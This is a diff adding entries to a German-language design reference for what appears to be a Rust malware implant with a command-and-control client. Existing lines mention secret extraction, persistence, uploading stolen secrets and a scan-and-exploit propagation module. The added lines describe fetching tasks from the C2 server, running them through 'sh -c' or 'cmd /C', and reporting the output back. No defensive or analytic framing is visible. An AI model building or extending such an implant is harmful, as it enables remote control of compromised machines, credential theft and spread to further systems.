@@ -61,8 +61,23 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
   POST `{base_url}/api/register`.
 - `[c2.rs:C2Client::upload_secret]` — `pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), C2Error>`;
   POST `{base_url}/api/secrets`.
+- `[c2.rs:C2Client::fetch_tasks]` — `pub async fn fetch_tasks(&self) -> Result<Vec<Task>, C2Error>`;
+  GET `{base_url}/api/tasks`.
+- `[c2.rs:C2Client::report_task_result]` — `pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), C2Error>`;
+  POST `{base_url}/api/tasks/result`.
 - `[c2.rs:ensure_ok]` — `async fn ensure_ok(resp: ureq::Response) -> Result<(), C2Error>` (privat);
   akzeptiert nur HTTP 200 und 201.
+
+### tasks.rs — Task-Ausführung
+
+- `[tasks.rs:run_pending_tasks]` — `pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, C2Error>`;
+  holt die offenen Tasks, führt diejenigen mit eigener Host-Kennung und Status
+  `pending` aus und meldet Status und Ausgabe zurück.
+- `[tasks.rs:execute_command]` — `fn execute_command(command: &str) -> CommandOutput` (privat);
+  führt das Kommando über die Shell aus (`sh -c` unter unix, `cmd /C` unter Windows) und
+  sammelt stdout und stderr.
+- `[tasks.rs:truncate]` — `fn truncate(text: &str, max_len: usize) -> String` (privat);
+  kürzt die Ausgabe an einer Zeichengrenze, damit kein UTF-8-Zeichen zerrissen wird.
 
 ### propagate.rs — Scan und Exploit
 
